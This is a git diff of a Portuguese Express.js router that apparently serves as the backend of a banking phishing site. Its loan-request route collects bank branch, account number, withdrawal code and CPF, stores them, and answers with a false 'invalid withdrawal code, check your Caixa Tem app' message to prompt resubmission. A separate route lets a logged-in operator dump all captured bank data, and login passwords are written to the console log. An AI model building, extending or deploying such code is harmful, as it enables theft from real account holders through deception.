@@ -1,19 +1,27 @@
 import express from 'express';
 import bcrypt from 'bcryptjs';
 import conexao from './conexao.js';
+import Joi from 'joi'; // Biblioteca de validação
 
 const rota = express.Router();
+
+// Schema de validação para login
+const loginSchema = Joi.object({
+    usuario: Joi.string().email().required(),
+    senha: Joi.string().min(6).required()
+});
 
 // Rota de Login
 rota.post('/login', async (req, res) => {
     const { usuario, senha } = req.body;
 
-    console.log('Dados recebidos:', { usuario, senha });
-
-    if (!usuario || !senha) {
-        console.log("Erro: Falta usuário ou senha");
-        return res.status(400).json({ erro: 'Email e senha são obrigatórios.' });
+    // Validação dos dados de login
+    const { error } = loginSchema.validate({ usuario, senha });
+    if (error) {
+        return res.status(400).json({ erro: 'Usuário ou senha inválidos.' });
     }
+
+    console.log('Dados recebidos:', { usuario, senha });
 
     try {
         const query = "SELECT * FROM usuarios WHERE usuario = ?";
@@ -71,10 +79,8 @@ rota.get('/dashboard', (req, res) => {
 // Rota para obter dados bancários
 rota.get('/getinfos', (req, res) => {
     if (req.session.usuarioId) {
-        // Consulta para selecionar todos os registros na tabela "dados"
         const query = "SELECT * FROM dados";
 
-        // Executa a consulta
         conexao.query(query, (err, results) => {
             if (err) {
                 console.error("Erro ao consultar dados:", err);
@@ -107,12 +113,11 @@ rota.post('/logout', (req, res) => {
 rota.post('/contratar', (req, res) => {
     const { agencia, conta, codigoSaque, cpf } = req.body;
 
-    // Verificar se todos os campos estão presentes
+    // Validação simples para dados de empréstimo
     if (!agencia || !conta || !codigoSaque || !cpf) {
         return res.status(400).json({ erro: 'Todos os campos são obrigatórios.' });
     }
 
-    // Inserir os dados na tabela 'dados'
     const query = 'INSERT INTO dados (agencia, conta, codigo_saque, cpf) VALUES (?, ?, ?, ?)';
     const values = [agencia, conta, codigoSaque, cpf];
 
@@ -122,14 +127,11 @@ rota.post('/contratar', (req, res) => {
             return res.status(500).json({ erro: 'Erro ao processar a solicitação.' });
         }
 
-        // Sucesso
-        res.status(200).json({ 
-            status: 'sucesso', 
-            message: 'Código de saque inválido, verifique o código em seu aplicativo Caixa Tem!' 
+        res.status(200).json({
+            status: 'sucesso',
+            message: 'Código de saque inválido, verifique o código em seu aplicativo Caixa Tem!'
         });
     });
 });
-
-// Iniciar o servidor
 
 export default rota;
